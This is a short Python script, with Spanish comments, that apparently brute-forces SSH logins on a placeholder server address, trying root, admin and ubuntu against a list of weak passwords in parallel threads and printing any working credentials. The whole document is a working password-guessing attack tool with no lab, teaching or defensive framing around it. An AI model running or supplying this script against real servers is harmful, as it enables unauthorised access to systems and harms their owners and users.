import paramiko
import threading
import time

ip ="<IP>"  # IP del servidor
users = ["root","admin","ubuntu"]
passwords = ["password","123456","admin123","qwerty"]

def try_ssh(user, pwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=user, password=pwd, timeout=3)
        print(f"[+] ¡Joder, éxito! Login: {user}:{pwd}")
        client.close()
    except:
        pass

threads = []
for user in users:
    for pwd in passwords:
        t = threading.Thread(target=try_ssh, args=(user, pwd))
        threads.append(t)
        t.start()
        time.sleep(0.1)  # Evita saturar

for t in threads:
    t.join()